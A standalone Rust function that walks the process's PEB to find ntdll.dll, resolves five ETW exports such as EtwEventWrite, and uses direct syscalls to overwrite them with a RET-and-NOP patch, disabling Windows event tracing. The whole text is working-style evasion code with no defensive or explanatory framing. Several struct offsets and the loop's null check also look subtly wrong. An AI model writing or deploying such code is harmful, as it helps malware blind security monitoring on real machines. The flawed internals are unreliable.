unsafe fn patch_etw() {
    use ntapi::ntpsapi::NtCurrentProcess;
    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
    use winapi::ctypes::c_void;
    use winapi::shared::ntdef::NT_SUCCESS;
    use rust_syscalls::syscall;

    #[repr(C)]
    struct PEB {
        _reserved: [u8; 8],
        ldr: *mut PEB_LDR_DATA,
    }

    #[repr(C)]
    struct PEB_LDR_DATA {
        _reserved: [u8; 16],
        in_load_order_module_list: *mut LIST_ENTRY,
    }

    #[repr(C)]
    struct LIST_ENTRY {
        flink: *mut LIST_ENTRY,
        blink: *mut LIST_ENTRY,
    }

    #[repr(C)]
    struct LDR_DATA_TABLE_ENTRY {
        _reserved: [u8; 32],
        dll_base: *mut u8,
        _reserved2: [u8; 24],
        base_dll_name: *mut u16,
    }

    let peb_ptr: *mut PEB;
    unsafe {
        #[cfg(target_arch = "x86_64")]
        {
            let peb_addr: usize;
            std::arch::asm!("mov {0}, gs:[0x60]", out(reg) peb_addr);
            peb_ptr = peb_addr as *mut PEB;
        }
        #[cfg(target_arch = "x86")]
        {
            let peb_addr: usize;
            std::arch::asm!("mov {0}, fs:[0x30]", out(reg) peb_addr);
            peb_ptr = peb_addr as *mut PEB;
        }
    }

    let mut current = (*(*peb_ptr).ldr).in_load_order_module_list;
    let ntdll_name = b"ntdll.dll\0";
    let mut ntdll_base: *mut u8 = std::ptr::null_mut();

    while !current.is_null() {
        let entry = current as *mut LDR_DATA_TABLE_ENTRY;
        let dll_name = (*entry).base_dll_name;
        if !dll_name.is_null() {
            let mut i = 0;
            let mut match_found = true;
            while ntdll_name[i] != 0 {
                if (*dll_name.add(i)) as u8 != ntdll_name[i] {
                    match_found = false;
                    break;
                }
                i += 1;
            }
            if match_found && (*dll_name.add(i)) as u8 == 0 {
                ntdll_base = (*entry).dll_base;
                break;
            }
        }
        current = (*current).flink;
    }

    if ntdll_base.is_null() { return; }

    // PE32+ layout: export data directory is the first entry, located after
    // the NT signature (4), the file header (20) and the optional header
    // fixed part (112). Export directory field offsets are relative.
    const DOS_E_LFANEW_OFFSET: usize = 60;
    const NT_EXPORT_DIR_OFFSET: usize = 136;
    const EXPORT_NUMBER_OF_NAMES_OFFSET: usize = 24;
    const EXPORT_FUNCTIONS_OFFSET: usize = 28;
    const EXPORT_NAMES_OFFSET: usize = 32;
    const EXPORT_NAME_ORDINALS_OFFSET: usize = 36;

    fn read_u32(base: *const u8, offset: usize) -> u32 {
        let mut bytes = [0u8; 4];
        unsafe { std::ptr::copy_nonoverlapping(base.add(offset), bytes.as_mut_ptr(), 4) };
        u32::from_le_bytes(bytes)
    }

    fn read_u16(base: *const u8, offset: usize) -> u16 {
        let mut bytes = [0u8; 2];
        unsafe { std::ptr::copy_nonoverlapping(base.add(offset), bytes.as_mut_ptr(), 2) };
        u16::from_le_bytes(bytes)
    }

    let nt_headers = ntdll_base.add(read_u32(ntdll_base, DOS_E_LFANEW_OFFSET) as usize);
    let export_dir = ntdll_base.add(read_u32(nt_headers, NT_EXPORT_DIR_OFFSET) as usize);

    let number_of_names = read_u32(export_dir, EXPORT_NUMBER_OF_NAMES_OFFSET);
    let address_of_functions = read_u32(export_dir, EXPORT_FUNCTIONS_OFFSET);
    let address_of_names = read_u32(export_dir, EXPORT_NAMES_OFFSET);
    let address_of_name_ordinals = read_u32(export_dir, EXPORT_NAME_ORDINALS_OFFSET);

    let names_table = ntdll_base.add(address_of_names as usize);
    let ordinals_table = ntdll_base.add(address_of_name_ordinals as usize);
    let functions_table = ntdll_base.add(address_of_functions as usize);

    let mut etw_functions = Vec::new();
    let target_names: [&[u8]; 5] = [
        b"EtwEventWrite\0",
        b"EtwEventWriteFull\0",
        b"EtwEventRegister\0",
        b"EtwEventUnregister\0",
        b"EtwEventEnabled\0",
    ];

    for target_name in target_names.iter() {
        for i in 0..number_of_names {
            let name_ptr = ntdll_base.add(read_u32(names_table, i as usize * 4) as usize);

            let mut j = 0;
            while target_name[j] != 0 && unsafe { *name_ptr.add(j) } != 0 {
                if target_name[j] != unsafe { *name_ptr.add(j) } { break; }
                j += 1;
            }

            if target_name[j] == 0 && unsafe { *name_ptr.add(j) } == 0 {
                let ordinal = read_u16(ordinals_table, i as usize * 2) as u32;
                let func_rva = read_u32(functions_table, ordinal as usize * 4);
                etw_functions.push(ntdll_base.add(func_rva as usize));
                break;
            }
        }
    }

    for mut func_addr in etw_functions {
        let mut old_protect: u32 = 0;
        let mut size: usize = 16;

        let status = syscall!(
            "NtProtectVirtualMemory",
            NtCurrentProcess,
            &mut func_addr as *mut *mut u8 as *mut *mut c_void,
            &mut size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect
        );

        if !NT_SUCCESS(status) { continue; }

        let patch_bytes: [u8; 16] = [0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                                     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
        unsafe {
            std::ptr::copy_nonoverlapping(
                patch_bytes.as_ptr(),
                func_addr as *mut u8,
                16,
            );
        }

        let _ = syscall!(
            "NtProtectVirtualMemory",
            NtCurrentProcess,
            &mut func_addr as *mut *mut u8 as *mut *mut c_void,
            &mut size,
            old_protect,
            &mut 0
        );
    }
}
